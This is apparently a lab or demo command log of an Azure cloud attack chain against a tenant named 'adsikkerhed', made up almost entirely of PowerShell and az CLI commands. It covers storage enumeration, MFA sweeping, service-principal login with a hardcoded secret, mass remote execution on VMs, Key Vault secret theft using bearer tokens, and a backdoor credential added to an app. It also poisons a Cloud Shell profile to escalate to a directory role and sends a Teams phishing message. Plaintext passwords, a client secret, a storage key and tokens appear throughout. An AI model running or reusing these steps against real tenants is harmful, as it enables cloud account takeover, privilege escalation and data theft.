Import-Module .\MicroBurst\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base adsikkerhed
Invoke-EnumerateAzureBlobs -Base adsikkerhed
Invoke-WebRequest "https://adsikkerhed.blob.core.windows.net/files/test.csv" -OutFile .\output\test.csv
Get-Content .\output\test.csv

Import-Module .\MFASweep\MFASweep.ps1
Invoke-MFASweep -Username "nfp@adsikkerhed.dk" -Password "%cP&KCuC48YEYs3l3t9o!fIJU"

Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force
Import-Module Az
$Credentials = Get-Credential
Connect-AzAccount -Credential $Credentials
Connect-AzureAD


Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}

az role assignment list --assignee 218bc93b-de80-4220-a504-6351721c24c0 --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'

#Open Azure AD
#nfp@adsikkerhed.dk %cP&KCuC48YEYs3l3t9o!fIJU
#Invite guest (nichlas.automationadmin@protonmail.com)

#Open new PowerShell window
#Connect nichlas.automationadmin / oRSTyQnaSa62%ldxlVo3Wx&2t
Connect-AzAccount
Import-Module .\MicroBurst\MicroBurst.psm1
Get-AzDomainInfo -folder .\adsikkerhed-output\ -Users Y -Groups N -StorageAccounts N -VMs N -NetworkInfo N -RBAC N
Get-Content .\adsikkerhed-output\Az\ADSIKKERHED\Resources\AutomationAccounts\AutomationAccount\RunBookPowerShell.ps1

Get-AzADServicePrincipal -DisplayName VMContributor
Get-AzTenant

$AppID = '78691715-1a35-42b2-88db-0b9d85ad4731'
$Secret = '7S6_xL3pekVzr1bU1pV0Rvy6-SsKu6KR4C'
$TenantID = '2230b2b1-298b-4b13-9de5-852b1d16f118'
$SecureStringPWD = ConvertTo-SecureString $Secret -AsPlainText -Force
[PSCredential]$Credentials = New-Object System.Management.Automation.PSCredential ($AppID, $SecureStringPWD)

Connect-AzAccount -Credential $Credentials -ServicePrincipal -Tenant $TenantID
az login --service-principal -u 78691715-1a35-42b2-88db-0b9d85ad4731 -p "7S6_xL3pekVzr1bU1pV0Rvy6-SsKu6KR4C" -t 2230b2b1-298b-4b13-9de5-852b1d16f118


az role assignment list --assignee 78691715-1a35-42b2-88db-0b9d85ad4731 --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'

$VMs = Get-AzVM -Status | Where-Object {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}
$VMs
cat .\jobs.ps1
$VMs | Invoke-AzVMRunCommand -CommandId 'RunPowershellScript' -ScriptPath .\jobs.ps1

$mgmtToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyIsImtpZCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzIyMzBiMmIxLTI5OGItNGIxMy05ZGU1LTg1MmIxZDE2ZjExOC8iLCJpYXQiOjE2NDc2OTk4NDMsIm5iZiI6MTY0NzY5OTg0MywiZXhwIjoxNjQ3Nzg2NTQzLCJhaW8iOiJFMlpnWVBpcng3bFU0TXVsRTllWWoyNjRWUGwwTmdBPSIsImFwcGlkIjoiNjgxMGZjZjAtZGQ4Yy00ZDA4LTljNmEtNDU5ZWMyYTdmZjA5IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZTYzNDljZGYtZmE4MS00ZjYyLWE4OWMtZTNjMzJlMWIyYTI3IiwicmgiOiIwLkFWNEFzYkl3SW9zcEUwdWQ1WVVySFJieEdFWklmM2tBdXRkUHVrUGF3ZmoyTUJOZUFBQS4iLCJzdWIiOiJlNjM0OWNkZi1mYTgxLTRmNjItYTg5Yy1lM2MzMmUxYjJhMjciLCJ0aWQiOiIyMjMwYjJiMS0yOThiLTRiMTMtOWRlNS04NTJiMWQxNmYxMTgiLCJ1dGkiOiJrNHpWT0EzcjdFYXlvcW0wREptaEFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvZDM3ZjMwZjQtZDM5ZC00YzM0LWIxMzktZTMxYjZiZWMyMDAyL3Jlc291cmNlZ3JvdXBzL1ZNUkcvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9BWkhBQ0tNYW5hZ2VkSWRlbnRpdHkiLCJ4bXNfdGNkdCI6IjE1OTM1MTMzOTgifQ.p8Y--SN9XchjP7z3-llsbHTCAhkY8ulJ891oxRjTYWtz4vo8IZW03dACeHKKJmJmX9MPJ-Hl-VeEITeZnK1G4tUEsAloj-kzb41yaIQft1dvQ6SUQLvh537njUdP-6u7e25a5kD9SiAG9iK6KnkRcm5SRsqx39LbEg9gjzv1oATdYRcY7umUc7cMsJ9-bzGdjFbhuWzvYmDp4jVPI8A4zS1rZZKtMbCbfQ_eqlU-XxA7N5cGP86V6A7HG1xFwdJbb-fNoSMpJZSgpNiWwsiBhXkRwqOzVGA_epI5910q6IKH2tD6mh7NnqX0YB30D-tNWFWJC8ypFliMPQWZJCtg8g"
$vaultToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyIsImtpZCI6ImpTMVhvMU9XRGpfNTJ2YndHTmd2UU8yVnpNYyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzIyMzBiMmIxLTI5OGItNGIxMy05ZGU1LTg1MmIxZDE2ZjExOC8iLCJpYXQiOjE2NDc2OTk4NDMsIm5iZiI6MTY0NzY5OTg0MywiZXhwIjoxNjQ3Nzg2NTQzLCJhaW8iOiJFMlpnWU5BenlmdlRrWFYxeGRtckc5cG16bXFjQ1FBPSIsImFwcGlkIjoiNjgxMGZjZjAtZGQ4Yy00ZDA4LTljNmEtNDU5ZWMyYTdmZjA5IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4LyIsIm9pZCI6ImU2MzQ5Y2RmLWZhODEtNGY2Mi1hODljLWUzYzMyZTFiMmEyNyIsInJoIjoiMC5BVjRBc2JJd0lvc3BFMHVkNVlVckhSYnhHRG16cU0taWdocEhvOGtQd0w1NlFKTmVBQUEuIiwic3ViIjoiZTYzNDljZGYtZmE4MS00ZjYyLWE4OWMtZTNjMzJlMWIyYTI3IiwidGlkIjoiMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4IiwidXRpIjoiS2ZkWVlBLTRKRVNSZ2RtU3hBR3BBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2QzN2YzMGY0LWQzOWQtNGMzNC1iMTM5LWUzMWI2YmVjMjAwMi9yZXNvdXJjZWdyb3Vwcy9WTVJHL3Byb3ZpZGVycy9NaWNyb3NvZnQuTWFuYWdlZElkZW50aXR5L3VzZXJBc3NpZ25lZElkZW50aXRpZXMvQVpIQUNLTWFuYWdlZElkZW50aXR5In0.JmABfSMFodWk_v0B4tRgWIBGTdYcbW50FQJuYJTZ_F2UdrKgCHJcEfhrNQ_cz7kq1bXa9i0zYdIwsfYHv_sONX0a9xCGPtvCz3dbSvh5jb5a0u6oBvEV0wWhr4mPMeZaevRadnnJhA3Ua9MuDNXdqgKnk29BbSJxrEKDxOODN1OTZZOfzWDfflm6eTYFcHc1jktzXR0BCUMLcyrpZFcYW62hbJze0ikEZBQysB4cTi_WnCWz_klJwFzKOKoNGpAKbxbe8L14JEvCcmteIyPqb9pSTFnU7TCyWSfO8s2mpmwXJxnjos8OyGd_PjoLjrffXFhHDCnNcrw48NRmgZW8Jw"

Import-Module .\MicroBurst\REST\MicroBurst-AzureREST.psm1
Get-AzKeyVaultSecretsREST -managementToken $mgmtToken -vaultToken $vaultToken -Verbose -SubscriptionId (Get-AzContext).Subscription.Id

# User = AppOwner@adsikkerhed.dk
# Password = %cP&KCuC48YEYs3l3t9o!fIJU
$Credentials = Get-Credential
Connect-AzureAD -Credential $Credentials

Import-Module .\AzureHound.ps1
$path = (Get-Location).Path+"\output"
Invoke-AzureHound -OutputDirectory $path

$ServicePrincipal = Get-AzureADServicePrincipal -Filter "DisplayName eq 'HackingApp'"
New-AzureADServicePrincipalPasswordCredential -ObjectId $ServicePrincipal.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "06-07-2021 12:00:00" -Value SuperDuperPassword

az login -u 995d5753-b953-48fa-a754-7cb89bcfca97 -p SuperDuperPassword -t 2230b2b1-298b-4b13-9de5-852b1d16f118 --allow-no-subscriptions --service-principal


az role assignment list --assignee 995d5753-b953-48fa-a754-7cb89bcfca97 --include-inherited --all --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'
az storage account list --query '[].{Name:name}'
az storage share list --account-name cloudshellprivadmin
az storage file list --share-name cspa --account-name cloudshellprivadmin
az storage account keys list -n cloudshellprivadmin
az storage file download-batch -d C:\AzureRT\output\cloudshell -s cspa --account-name cloudshellprivadmin --account-key "7joqeywltVDj5Q9Tj+Ch3v1QGmcy/Q1XkzJUNqzYgm2ysR8KHqkt8vLa45ayRBxfII/Yknpg1QDcp1n4O0tWEQ=="
ubuntu.exe
cd /mnt/c/AzureRT/output//cloudshell/.cloudconsole
sudo mkdir /cloudpoison
sudo mount acc_privadmin.img /cloudpoison
cd /cloudpoison
sudo mkdir .config
sudo mkdir .config/PowerShell
sudo touch .config/PowerShell/Microsoft.PowerShell_profile.ps1
sudo chmod 777 .config/PowerShell/Microsoft.PowerShell_profile.ps1
echo "Connect-AzureAD; Add-AzureADDirectoryRoleMember -ObjectId 1246bcfd-42dc-4bb7-a86d-3637ca422b21 -RefObjectId 61E0C392-6D3B-467A-BA98-873D81AD99BC" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1
sudo umount /cloudpoison
exit
az storage file upload --account-key "7joqeywltVDj5Q9Tj+Ch3v1QGmcy/Q1XkzJUNqzYgm2ysR8KHqkt8vLa45ayRBxfII/Yknpg1QDcp1n4O0tWEQ==" --account-name cloudshellprivadmin --share-name cspa --path ".cloudconsole/acc_privadmin.img" --source ".\output\cloudshell\.cloudconsole\acc_privadmin.img"


Install-Module AADInternals
Import-Module AADInternals

# User = AppOwner@adsikkerhed.dk
# Password = %cP&KCuC48YEYs3l3t9o!fIJU
$Credentials = Get-Credential

Get-AADIntAccessTokenForTeams -Credentials $Credentials -SaveToCache
Send-AADIntTeamsMessage -Recipients "privadmin@adsikkerhed.dk" -Message "Check this out! Free Bitcoins! https://bit.ly/3BiTcoq"
